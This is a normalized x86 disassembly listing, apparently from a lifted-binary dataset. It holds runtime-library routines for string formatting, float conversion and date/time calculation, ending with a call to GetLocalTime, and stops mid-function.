pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408966
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_4089ae
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408966
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408878
pop edx
or edx edx
je r-xdata
sub_408966
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408bdb
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4089ae
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408bdb
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_4087fc
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_4089d5 ]
mov ebx ecx
sub cl 0x44
je sub_407fa0
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404114
jmp r-xdata
mov esi sub_404174
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407fa0
sub cl 0x44
je sub_407f34
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407f34
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407fa0
mov ecx 0x10
cmp bl 0x58
je sub_407f34
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408854
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408d94
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407f34
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408bfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408588
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408884
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408c3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408588
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408884
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408c90
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4041ac
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041ac
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4041ac
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408884
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403fdc
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403eec
mov eax esi
mov edx ebx
call sub_404538
mov eax [ ebp - 0x4 ]
call sub_4041ac
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408884
mov edx esi
xchg edx eax
call sub_404538
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408d50
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408d94
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409068
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408e93
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408e9d
call sub_408e93
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408d50
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408ef9
call sub_408e93
call sub_408e8a
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408e8a
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408d50
retn
xor ecx ecx
sub_408f35
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408e8a
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408e8a
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408f9a
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408fee
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408f35
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409068
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409095
jmp r-xdata
call sub_4091b7
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409095
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402cc0
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4091b7
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409294
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40934b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409356
neg edx
mov ecx esi
call sub_409356
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40934b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409372
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402cc0
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409356
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409372
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4093a8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408d94
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fdc
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4093d8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408d94
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fdc
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409424
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043ac
mov edx esp
xor ecx ecx
call sub_409294
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409450
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043ac
mov edx esp
xor ecx ecx
call sub_409294
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409498
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4094dc
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_40954c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4094dc
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407bd8
sub_40958c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409498
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407bbc
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407bbc
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407bbc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4095e8
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409624
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_4095e8
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4096ec
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409624
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407bd8
sub_40971c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409498
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407bbc
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407bbc
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407bbc
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_4095e8
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409868
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_40971c
pop esi
pop ecx
pop ebp
retn 0x8
sub_409888
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ ebx + 0x6 ]
lea edx [ ebx + 0x2 ]
mov eax ebx
call sub_40971c
dec [ ebx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0xe ]
push eax
lea ecx [ ebx + 0xc ]
lea edx [ ebx + 0xa ]
lea eax [ ebx + 0x8 ]
call sub_40958c
pop ebx
pop ebp
retn 0x8
sub_4098c8
push ebx
add esp 0xfffffff8
mov ebx eax
mov cx [ ebx + 0x6 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_4096ec
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_40954c
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_40954c
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_409938
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409498
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409960
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_4096ec
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
